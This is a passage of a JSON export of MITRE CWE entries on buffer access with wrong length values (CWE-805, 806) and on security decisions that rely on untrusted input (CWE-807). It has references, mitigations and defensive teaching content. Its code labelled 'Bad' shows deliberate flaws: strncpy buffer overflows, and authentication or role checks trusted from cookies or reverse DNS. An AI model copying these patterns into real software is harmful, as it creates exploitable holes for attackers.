              "ExampleCode": "```\n\tvoid getUserInfo(char *username, struct _USER_INFO_2 info){\n\t\tWCHAR unicodeUser[UNLEN+1];\n\t\tMultiByteToWideChar(CP_ACP, 0, username, -1, unicodeUser, sizeof(unicodeUser));\n\t\tNetUserGetInfo(NULL, unicodeUser, 2, (LPBYTE *)&info);\n\t}\n```"
            },
            {
              "BodyText": "This function incorrectly passes the size of unicodeUser in bytes instead of characters. The call to MultiByteToWideChar() can therefore write up to (UNLEN+1)*sizeof(WCHAR) wide characters, or (UNLEN+1)*sizeof(WCHAR)*sizeof(WCHAR) bytes, to the unicodeUser array, which has only (UNLEN+1)*sizeof(WCHAR) bytes allocated."
            },
            {
              "BodyText": "If the username string contains more than UNLEN characters, the call to MultiByteToWideChar() will overflow the buffer unicodeUser."
            }
          ]
        }
      ],
      "ObservedExamples": [
        {
          "Reference": "CVE-2011-1959",
          "Description": "Chain: large length value causes buffer over-read (CWE-126)",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2011-1959"
        },
        {
          "Reference": "CVE-2011-1848",
          "Description": "Use of packet length field to make a calculation, then copy into a fixed-size buffer",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2011-1848"
        },
        {
          "Reference": "CVE-2011-0105",
          "Description": "Chain: retrieval of length value from an uninitialized memory location",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2011-0105"
        },
        {
          "Reference": "CVE-2011-0606",
          "Description": "Crafted length value in document reader leads to buffer overflow",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2011-0606"
        },
        {
          "Reference": "CVE-2011-0651",
          "Description": "SSL server overflow when the sum of multiple length fields exceeds a given value",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2011-0651"
        },
        {
          "Reference": "CVE-2010-4156",
          "Description": "Language interpreter API function doesn't validate length argument, leading to information exposure",
          "Link": "https://www.cve.org/CVERecord?id=CVE-2010-4156"
        }
      ],
      "AffectedResources": [
        "Memory"
      ],
      "TaxonomyMappings": [
        {
          "TaxonomyName": "CERT C Secure Coding",
          "EntryID": "ARR38-C",
          "EntryName": "Guarantee that library functions do not form invalid pointers",
          "MappingFit": "Imprecise"
        }
      ],
      "RelatedAttackPatterns": [
        "100",
        "256"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-7",
          "Section": "Chapter 6, \"Why ACLs Are Important\" Page 171",
          "Authors": [
            "Michael Howard",
            "David LeBlanc"
          ],
          "Title": "Writing Secure Code",
          "Edition": "2nd Edition",
          "PublicationYear": "2002",
          "PublicationMonth": "12",
          "PublicationDay": "04",
          "Publisher": "Microsoft Press",
          "URL": "https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223"
        },
        {
          "ExternalReferenceID": "REF-58",
          "Authors": [
            "Michael Howard"
          ],
          "Title": "Address Space Layout Randomization in Windows Vista",
          "URL": "https://learn.microsoft.com/en-us/archive/blogs/michael_howard/address-space-layout-randomization-in-windows-vista",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-59",
          "Authors": [
            "Arjan van de Ven"
          ],
          "Title": "Limiting buffer overflows with ExecShield",
          "URL": "https://archive.is/saAFo",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-60",
          "Title": "PaX",
          "URL": "https://en.wikipedia.org/wiki/Executable_space_protection#PaX",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-741",
          "Authors": [
            "Jason Lam"
          ],
          "Title": "Top 25 Series - Rank 12 - Buffer Access with Incorrect Length Value",
          "PublicationYear": "2010",
          "PublicationMonth": "03",
          "PublicationDay": "11",
          "Publisher": "SANS Software Security Institute",
          "URL": "https://web.archive.org/web/20100316043717/http://blogs.sans.org:80/appsecstreetfighter/2010/03/11/top-25-series-rank-12-buffer-access-with-incorrect-length-value/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-57",
          "Authors": [
            "Matt Messier",
            "John Viega"
          ],
          "Title": "Safe C String Library v1.0.3",
          "URL": "http://www.gnu-darwin.org/www001/ports-1.5a-CURRENT/devel/safestr/work/safestr-1.0.3/doc/safestr.html",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-56",
          "Authors": [
            "Microsoft"
          ],
          "Title": "Using the Strsafe.h Functions",
          "URL": "https://learn.microsoft.com/en-us/windows/win32/menurc/strsafe-ovw?redirectedfrom=MSDN",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-61",
          "Authors": [
            "Microsoft"
          ],
          "Title": "Understanding DEP as a mitigation technology part 1",
          "URL": "https://msrc.microsoft.com/blog/2009/06/understanding-dep-as-a-mitigation-technology-part-1/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-76",
          "Authors": [
            "Sean Barnum",
            "Michael Gegick"
          ],
          "Title": "Least Privilege",
          "PublicationYear": "2005",
          "PublicationMonth": "09",
          "PublicationDay": "14",
          "URL": "https://web.archive.org/web/20211209014121/https://www.cisa.gov/uscert/bsi/articles/knowledge/principles/least-privilege",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-64",
          "Authors": [
            "Grant Murphy"
          ],
          "Title": "Position Independent Executables (PIE)",
          "PublicationYear": "2012",
          "PublicationMonth": "11",
          "PublicationDay": "28",
          "Publisher": "Red Hat",
          "URL": "https://www.redhat.com/en/blog/position-independent-executables-pie",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-1332",
          "Authors": [
            "John Richard Moser"
          ],
          "Title": "Prelink and address space randomization",
          "PublicationYear": "2006",
          "PublicationMonth": "07",
          "PublicationDay": "05",
          "URL": "https://lwn.net/Articles/190139/",
          "URLDate": "2023-04-26"
        },
        {
          "ExternalReferenceID": "REF-1333",
          "Authors": [
            "Dmitry Evtyushkin, Dmitry Ponomarev, Nael Abu-Ghazaleh"
          ],
          "Title": "Jump Over ASLR: Attacking Branch Predictors to Bypass ASLR",
          "PublicationYear": "2016",
          "URL": "http://www.cs.ucr.edu/~nael/pubs/micro16.pdf",
          "URLDate": "2023-04-26"
        },
        {
          "ExternalReferenceID": "REF-1334",
          "Authors": [
            "D3FEND"
          ],
          "Title": "Stack Frame Canary Validation (D3-SFCV)",
          "PublicationYear": "2023",
          "URL": "https://d3fend.mitre.org/technique/d3f:StackFrameCanaryValidation/",
          "URLDate": "2023-04-26"
        },
        {
          "ExternalReferenceID": "REF-1335",
          "Authors": [
            "D3FEND"
          ],
          "Title": "Segment Address Offset Randomization (D3-SAOR)",
          "PublicationYear": "2023",
          "URL": "https://d3fend.mitre.org/technique/d3f:SegmentAddressOffsetRandomization/",
          "URLDate": "2023-04-26"
        },
        {
          "ExternalReferenceID": "REF-1336",
          "Authors": [
            "D3FEND"
          ],
          "Title": "Process Segment Execution Prevention (D3-PSEP)",
          "PublicationYear": "2023",
          "URL": "https://d3fend.mitre.org/technique/d3f:ProcessSegmentExecutionPrevention/",
          "URLDate": "2023-04-26"
        },
        {
          "ExternalReferenceID": "REF-1337",
          "Section": "Memory information leaks",
          "Authors": [
            "Alexander Sotirov and Mark Dowd"
          ],
          "Title": "Bypassing Browser Memory Protections: Setting back browser security by 10 years",
          "PublicationYear": "2008",
          "URL": "https://www.blackhat.com/presentations/bh-usa-08/Sotirov_Dowd/bh08-sotirov-dowd.pdf",
          "URLDate": "2023-04-26"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "806",
      "Name": "Buffer Access Using Size of Source Buffer",
      "Abstraction": "Variant",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses the size of a source buffer when reading from or writing to a destination buffer, which may cause it to access memory that is outside of the bounds of the buffer.",
      "ExtendedDescription": "When the size of the destination is smaller than the size of the source, a buffer overflow could occur.",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "805",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "WeaknessOrdinalities": [
        {
          "Ordinality": "Resultant"
        },
        {
          "Ordinality": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Name": "C",
          "Prevalence": "Sometimes"
        },
        {
          "Type": "Language",
          "Name": "C++",
          "Prevalence": "Sometimes"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Availability"
          ],
          "Impact": [
            "Modify Memory",
            "DoS: Crash, Exit, or Restart",
            "DoS: Resource Consumption (CPU)"
          ],
          "Note": "Buffer overflows generally lead to crashes. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop."
        },
        {
          "Scope": [
            "Integrity",
            "Confidentiality",
            "Availability"
          ],
          "Impact": [
            "Read Memory",
            "Modify Memory",
            "Execute Unauthorized Code or Commands"
          ],
          "Note": "Buffer overflows often can be used to execute arbitrary code, which is usually outside the scope of a program's implicit security policy."
        },
        {
          "Scope": [
            "Access Control"
          ],
          "Impact": [
            "Bypass Protection Mechanism"
          ],
          "Note": "When the consequence is arbitrary code execution, this can often be used to subvert any other security service."
        }
      ],
      "PotentialMitigations": [
        {
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "Use an abstraction library to abstract away risky APIs. Examples include the Safe C String Library (SafeStr) by Viega, and the Strsafe.h library from Microsoft. This is not a complete solution, since many buffer overflows are not related to strings."
        },
        {
          "MitigationID": "MIT-10",
          "Phase": [
            "Operation",
            "Build and Compilation"
          ],
          "Strategy": "Environment Hardening",
          "Description": "\n\nUse automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking. \n\n\n D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail. \n",
          "Effectiveness": "Defense in Depth",
          "EffectivenessNotes": "\n\n This is not necessarily a complete solution, since these mechanisms only detect certain types of overflows. In addition, the result is still a denial of service, since the typical response is to exit the application. \n"
        },
        {
          "Phase": [
            "Implementation"
          ],
          "Description": "Programmers should adhere to the following rules when allocating and managing their applications memory: Double check that your buffer is as large as you specify. When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string. Check buffer boundaries if calling this function in a loop and make sure there is no danger of writing past the allocated space. Truncate all input strings to a reasonable length before passing them to the copy and concatenation functions."
        },
        {
          "MitigationID": "MIT-11",
          "Phase": [
            "Operation",
            "Build and Compilation"
          ],
          "Strategy": "Environment Hardening",
          "Description": "\n\nRun or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code. \n\n\n Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as \"rebasing\" (for Windows) and \"prelinking\" (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking. \n\n\n For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335]. \n",
          "Effectiveness": "Defense in Depth",
          "EffectivenessNotes": "These techniques do not provide a complete solution. For instance, exploits frequently use a bug that discloses memory addresses in order to maximize reliability of code execution [REF-1337]. It has also been shown that a side-channel attack can bypass ASLR [REF-1333]."
        },
        {
          "MitigationID": "MIT-12",
          "Phase": [
            "Operation"
          ],
          "Strategy": "Environment Hardening",
          "Description": "\n\n Use a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment. \n\n\n For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336]. \n",
          "Effectiveness": "Defense in Depth",
          "EffectivenessNotes": "This is not a complete solution, since buffer overflows could be used to overwrite nearby variables to modify the software's state in dangerous ways. In addition, it cannot be used in cases in which self-modifying code is required. Finally, an attack could still cause a denial of service, since the typical response is to exit the application."
        },
        {
          "Phase": [
            "Build and Compilation",
            "Operation"
          ],
          "Description": "Most mitigating technologies at the compiler or OS level to date address only a subset of buffer overflow problems and rarely provide complete protection against even that subset. It is good practice to implement strategies to increase the workload of an attacker, such as leaving the attacker to guess an unknown value that changes every program execution."
        }
      ],
      "DemonstrativeExamples": [
        {
          "Entries": [
            {
              "IntroText": "In the following example, the source character string is copied to the dest character string using the method strncpy."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\t...\n\tchar source[21] = \"the character string\";\n\tchar dest[12];\n\tstrncpy(dest, source, sizeof(source)-1);\n\t...\n```"
            },
            {
              "BodyText": "However, in the call to strncpy the source character string is used within the sizeof call to determine the number of characters to copy. This will create a buffer overflow as the size of the source character string is greater than the dest character string. The dest character string should be used within the sizeof call to ensure that the correct number of characters are copied, as shown below."
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "```\n\t...\n\tchar source[21] = \"the character string\";\n\tchar dest[12];\n\tstrncpy(dest, source, sizeof(dest)-1);\n\t...\n```"
            }
          ]
        },
        {
          "Entries": [
            {
              "IntroText": "In this example, the method outputFilenameToLog outputs a filename to a log file. The method arguments include a pointer to a character string containing the file name and an integer for the number of characters in the string. The filename is copied to a buffer where the buffer size is set to a maximum size for inputs to the log file. The method then calls another method to save the contents of the buffer to the log file."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\t#define LOG_INPUT_SIZE 40\n```\n// saves the file name to a log file* \n\tint outputFilenameToLog(char *filename, int length) {\n\t```\n\t\t\tint success;\n```\n// buffer with size set to maximum size for input to log file* \n\t\t\tchar buf[LOG_INPUT_SIZE];\n\t\t\t\n\t\t\t\n\t\t\t *// copy filename to buffer* \n\t\t\tstrncpy(buf, filename, length);\n\t\t\t\n\t\t\t\n\t\t\t *// save to log file* \n\t\t\tsuccess = saveToLogFile(buf);\n\t\t\t\n\t\t\treturn success;}"
            },
            {
              "BodyText": "However, in this case the string copy method, strncpy, mistakenly uses the length method argument to determine the number of characters to copy rather than using the size of the local character string, buf. This can lead to a buffer overflow if the number of characters contained in character string pointed to by filename is larger then the number of characters allowed for the local character string. The string copy method should use the buf character string within a sizeof call to ensure that only characters up to the size of the buf array are copied to avoid a buffer overflow, as shown below."
            },
            {
              "Nature": "Good",
              "Language": "C",
              "ExampleCode": "```\n\t...\n```\n// copy filename to buffer* \n\tstrncpy(buf, filename, sizeof(buf)-1);\n\t..."
            }
          ]
        }
      ],
      "AffectedResources": [
        "Memory"
      ],
      "References": [
        {
          "ExternalReferenceID": "REF-56",
          "Authors": [
            "Microsoft"
          ],
          "Title": "Using the Strsafe.h Functions",
          "URL": "https://learn.microsoft.com/en-us/windows/win32/menurc/strsafe-ovw?redirectedfrom=MSDN",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-57",
          "Authors": [
            "Matt Messier",
            "John Viega"
          ],
          "Title": "Safe C String Library v1.0.3",
          "URL": "http://www.gnu-darwin.org/www001/ports-1.5a-CURRENT/devel/safestr/work/safestr-1.0.3/doc/safestr.html",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-58",
          "Authors": [
            "Michael Howard"
          ],
          "Title": "Address Space Layout Randomization in Windows Vista",
          "URL": "https://learn.microsoft.com/en-us/archive/blogs/michael_howard/address-space-layout-randomization-in-windows-vista",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-59",
          "Authors": [
            "Arjan van de Ven"
          ],
          "Title": "Limiting buffer overflows with ExecShield",
          "URL": "https://archive.is/saAFo",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-60",
          "Title": "PaX",
          "URL": "https://en.wikipedia.org/wiki/Executable_space_protection#PaX",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-61",
          "Authors": [
            "Microsoft"
          ],
          "Title": "Understanding DEP as a mitigation technology part 1",
          "URL": "https://msrc.microsoft.com/blog/2009/06/understanding-dep-as-a-mitigation-technology-part-1/",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-64",
          "Authors": [
            "Grant Murphy"
          ],
          "Title": "Position Independent Executables (PIE)",
          "PublicationYear": "2012",
          "PublicationMonth": "11",
          "PublicationDay": "28",
          "Publisher": "Red Hat",
          "URL": "https://www.redhat.com/en/blog/position-independent-executables-pie",
          "URLDate": "2023-04-07"
        },
        {
          "ExternalReferenceID": "REF-1332",
          "Authors": [
            "John Richard Moser"
          ],
          "Title": "Prelink and address space randomization",
          "PublicationYear": "2006",
          "PublicationMonth": "07",
          "PublicationDay": "05",
          "URL": "https://lwn.net/Articles/190139/",
          "URLDate": "2023-04-26"
        },
        {
          "ExternalReferenceID": "REF-1333",
          "Authors": [
            "Dmitry Evtyushkin, Dmitry Ponomarev, Nael Abu-Ghazaleh"
          ],
          "Title": "Jump Over ASLR: Attacking Branch Predictors to Bypass ASLR",
          "PublicationYear": "2016",
          "URL": "http://www.cs.ucr.edu/~nael/pubs/micro16.pdf",
          "URLDate": "2023-04-26"
        },
        {
          "ExternalReferenceID": "REF-1334",
          "Authors": [
            "D3FEND"
          ],
          "Title": "Stack Frame Canary Validation (D3-SFCV)",
          "PublicationYear": "2023",
          "URL": "https://d3fend.mitre.org/technique/d3f:StackFrameCanaryValidation/",
          "URLDate": "2023-04-26"
        },
        {
          "ExternalReferenceID": "REF-1335",
          "Authors": [
            "D3FEND"
          ],
          "Title": "Segment Address Offset Randomization (D3-SAOR)",
          "PublicationYear": "2023",
          "URL": "https://d3fend.mitre.org/technique/d3f:SegmentAddressOffsetRandomization/",
          "URLDate": "2023-04-26"
        },
        {
          "ExternalReferenceID": "REF-1336",
          "Authors": [
            "D3FEND"
          ],
          "Title": "Process Segment Execution Prevention (D3-PSEP)",
          "PublicationYear": "2023",
          "URL": "https://d3fend.mitre.org/technique/d3f:ProcessSegmentExecutionPrevention/",
          "URLDate": "2023-04-26"
        },
        {
          "ExternalReferenceID": "REF-1337",
          "Section": "Memory information leaks",
          "Authors": [
            "Alexander Sotirov and Mark Dowd"
          ],
          "Title": "Bypassing Browser Memory Protections: Setting back browser security by 10 years",
          "PublicationYear": "2008",
          "URL": "https://www.blackhat.com/presentations/bh-usa-08/Sotirov_Dowd/bh08-sotirov-dowd.pdf",
          "URLDate": "2023-04-26"
        }
      ],
      "MappingNotes": {
        "Usage": "Allowed",
        "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.",
        "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.",
        "Reasons": [
          "Acceptable-Use"
        ]
      }
    },
    {
      "ID": "807",
      "Name": "Reliance on Untrusted Inputs in a Security Decision",
      "Abstraction": "Base",
      "Structure": "Simple",
      "Status": "Incomplete",
      "Description": "The product uses a protection mechanism that relies on the existence or values of an input, but the input can be modified by an untrusted actor in a way that bypasses the protection mechanism.",
      "ExtendedDescription": "\n\nDevelopers may assume that inputs such as cookies, environment variables, and hidden form fields cannot be modified. However, an attacker could change these inputs using customized clients or other attacks. This change might not be detected. When security decisions such as authentication and authorization are made based on the values of these inputs, attackers can bypass the security of the software.\n\n\nWithout sufficient encryption, integrity checking, or other mechanism, any input that originates from an outsider cannot be trusted.\n",
      "LikelihoodOfExploit": "High",
      "RelatedWeaknesses": [
        {
          "Nature": "ChildOf",
          "CweID": "693",
          "ViewID": "1000",
          "Ordinal": "Primary"
        }
      ],
      "ApplicablePlatforms": [
        {
          "Type": "Language",
          "Class": "Not Language-Specific",
          "Prevalence": "Undetermined"
        }
      ],
      "ModesOfIntroduction": [
        {
          "Phase": "Architecture and Design",
          "Note": "COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic."
        },
        {
          "Phase": "Implementation"
        }
      ],
      "CommonConsequences": [
        {
          "Scope": [
            "Confidentiality",
            "Access Control",
            "Availability",
            "Other"
          ],
          "Impact": [
            "Bypass Protection Mechanism",
            "Gain Privileges or Assume Identity",
            "Varies by Context"
          ],
          "Note": "Attackers can bypass the security decision to access whatever is being protected. The consequences will depend on the associated functionality, but they can range from granting additional privileges to untrusted users to bypassing important security checks. Ultimately, this weakness may lead to exposure or modification of sensitive data, system crash, or execution of arbitrary code."
        }
      ],
      "DetectionMethods": [
        {
          "DetectionMethodID": "DM-10",
          "Method": "Manual Static Analysis",
          "Description": "Since this weakness does not typically appear frequently within a single software package, manual white box techniques may be able to provide sufficient code coverage and reduction of false positives if all potentially-vulnerable operations can be assessed within limited time constraints.",
          "Effectiveness": "High",
          "EffectivenessNotes": "The effectiveness and speed of manual analysis will be reduced if the there is not a centralized security mechanism, and the security logic is widely distributed throughout the software."
        },
        {
          "Method": "Automated Static Analysis - Binary or Bytecode",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBytecode Weakness Analysis - including disassembler + source code weakness analysis\n\t\tBinary Weakness Analysis - including disassembler + source code weakness analysis",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Manual Static Analysis - Binary or Bytecode",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tBinary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Dynamic Analysis with Automated Results Interpretation",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tWeb Application Scanner\n\t\tWeb Services Scanner\n\t\tDatabase Scanners",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Dynamic Analysis with Manual Results Interpretation",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tFuzz Tester\n\t\tFramework-based Fuzzer\n\t\tMonitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Manual Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tManual Source Code Review (not inspections)",
          "Effectiveness": "High"
        },
        {
          "Method": "Automated Static Analysis - Source Code",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tCost effective for partial coverage:\n```\n\n\t\tSource code Weakness Analyzer\n\t\tContext-configured Source Code Weakness Analyzer",
          "Effectiveness": "SOAR Partial"
        },
        {
          "Method": "Architecture or Design Review",
          "Description": "\n\nAccording to SOAR, the following detection techniques may be useful:\n\n```\n\t\tHighly cost effective:\n```\n\n\t\tInspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)\n\t\tFormal Methods / Correct-By-Construction\n\t```\n\t\tCost effective for partial coverage:\n```\n\n\t\tAttack Modeling",
          "Effectiveness": "High"
        }
      ],
      "PotentialMitigations": [
        {
          "MitigationID": "MIT-14",
          "Phase": [
            "Architecture and Design"
          ],
          "Strategy": "Attack Surface Reduction",
          "Description": "\n\nStore state information and sensitive data on the server side only.\n\n\nEnsure that the system definitively and unambiguously keeps track of its own state and user state and has rules defined for legitimate state transitions. Do not allow any application user to affect state directly in any way other than through legitimate actions leading to state transitions.\n\n\nIf information must be stored on the client, do not do so without encryption and integrity checking, or otherwise having a mechanism on the server side to catch tampering. Use a message authentication code (MAC) algorithm, such as Hash Message Authentication Code (HMAC) [REF-529]. Apply this against the state or sensitive data that has to be exposed, which can guarantee the integrity of the data - i.e., that the data has not been modified. Ensure that a strong hash function is used (CWE-328).\n"
        },
        {
          "MitigationID": "MIT-4.2",
          "Phase": [
            "Architecture and Design"
          ],
          "Strategy": "Libraries or Frameworks",
          "Description": "\n\nUse a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.\n\n\nWith a stateless protocol such as HTTP, use a framework that maintains the state for you.\n\n\nExamples include ASP.NET View State [REF-756] and the OWASP ESAPI Session Management feature [REF-45].\n\n\nBe careful of language features that provide state support, since these might be provided as a convenience to the programmer and may not be considering security.\n"
        },
        {
          "MitigationID": "MIT-15",
          "Phase": [
            "Architecture and Design"
          ],
          "Description": "For any security checks that are performed on the client side, ensure that these checks are duplicated on the server side, in order to avoid CWE-602. Attackers can bypass the client-side checks by modifying values after the checks have been performed, or by changing the client to remove the client-side checks entirely. Then, these modified values would be submitted to the server."
        },
        {
          "MitigationID": "MIT-16",
          "Phase": [
            "Operation",
            "Implementation"
          ],
          "Strategy": "Environment Hardening",
          "Description": "When using PHP, configure the application so that it does not use register_globals. During implementation, develop the application so that it does not rely on this feature, but be wary of implementing a register_globals emulation that is subject to weaknesses such as CWE-95, CWE-621, and similar issues."
        },
        {
          "MitigationID": "MIT-6",
          "Phase": [
            "Architecture and Design",
            "Implementation"
          ],
          "Strategy": "Attack Surface Reduction",
          "Description": "\n\nUnderstand all the potential areas where untrusted inputs can enter your software: parameters or arguments, cookies, anything read from the network, environment variables, reverse DNS lookups, query results, request headers, URL components, e-mail, files, filenames, databases, and any external systems that provide data to the application. Remember that such inputs may be obtained indirectly through API calls.\n\n\nIdentify all inputs that are used for security decisions and determine if you can modify the design so that you do not have to rely on submitted inputs at all. For example, you may be able to keep critical information about the user's session on the server side instead of recording it within external data.\n"
        }
      ],
      "DemonstrativeExamples": [
        {
          "ID": "DX-15",
          "Entries": [
            {
              "IntroText": "The following code excerpt reads a value from a browser cookie to determine the role of the user."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tCookie[] cookies = request.getCookies();\n\tfor (int i =0; i< cookies.length; i++) {\n\t\tCookie c = cookies[i];\n\t\tif (c.getName().equals(\"role\")) {\n\t\t\tuserRole = c.getValue();\n\t\t}\n\t}\n```"
            }
          ]
        },
        {
          "ID": "DX-16",
          "Entries": [
            {
              "IntroText": "The following code could be for a medical records application. It performs authentication by checking if a cookie has been set."
            },
            {
              "Nature": "Bad",
              "Language": "PHP",
              "ExampleCode": "```\n\t$auth = $_COOKIES['authenticated'];\n\tif (! $auth) {\n\t\tif (AuthenticateUser($_POST['user'], $_POST['password']) == \"success\") {\n\t\t\t// save the cookie to send out in future responses\n\t\t\tsetcookie(\"authenticated\", \"1\", time()+60*60*2);\n\t\t}\n\t\telse {\n\t\t\tShowLoginScreen();\n\t\t\tdie(\"\\n\");\n\t\t}\n\t}\n\tDisplayMedicalHistory($_POST['patient_ID']);\n```"
            },
            {
              "BodyText": "The programmer expects that the AuthenticateUser() check will always be applied, and the \"authenticated\" cookie will only be set when authentication succeeds. The programmer even diligently specifies a 2-hour expiration for the cookie."
            },
            {
              "BodyText": "However, the attacker can set the \"authenticated\" cookie to a non-zero value such as 1. As a result, the $auth variable is 1, and the AuthenticateUser() check is not even performed. The attacker has bypassed the authentication."
            }
          ]
        },
        {
          "ID": "DX-17",
          "Entries": [
            {
              "IntroText": "In the following example, an authentication flag is read from a browser cookie, thus allowing for external control of user state data."
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tCookie[] cookies = request.getCookies();\n\tfor (int i =0; i< cookies.length; i++) {\n\t\tCookie c = cookies[i];\n\t\tif (c.getName().equals(\"authenticated\") && Boolean.TRUE.equals(c.getValue())) {\n\t\t\tauthenticated = true;\n\t\t}\n\t}\n```"
            }
          ]
        },
        {
          "ID": "DX-93",
          "Entries": [
            {
              "IntroText": "The following code samples use a DNS lookup in order to decide whether or not an inbound request is from a trusted host. If an attacker can poison the DNS cache, they can gain trusted status."
            },
            {
              "Nature": "Bad",
              "Language": "C",
              "ExampleCode": "```\n\tstruct hostent *hp;struct in_addr myaddr;\n\tchar* tHost = \"trustme.example.com\";\n\tmyaddr.s_addr=inet_addr(ip_addr_string);\n\thp = gethostbyaddr((char *) &myaddr, sizeof(struct in_addr), AF_INET);\n\tif (hp && !strncmp(hp->h_name, tHost, sizeof(tHost))) {\n\t\ttrusted = true;\n\t} else {\n\t\ttrusted = false;\n\t}\n```"
            },
            {
              "Nature": "Bad",
              "Language": "Java",
              "ExampleCode": "```\n\tString ip = request.getRemoteAddr();\n\tInetAddress addr = InetAddress.getByName(ip);\n\tif (addr.getCanonicalHostName().endsWith(\"trustme.com\")) {\n\t\ttrusted = true;\n\t}\n```"
            },
            {
              "Nature": "Bad",
              "Language": "C#",
              "ExampleCode": "```\n\tIPAddress hostIPAddress = IPAddress.Parse(RemoteIpAddress);\n\tIPHostEntry hostInfo = Dns.GetHostByAddress(hostIPAddress);\n\tif (hostInfo.HostName.EndsWith(\"trustme.com\")) {\n\t\ttrusted = true;\n\t}\n```"
            },
            {
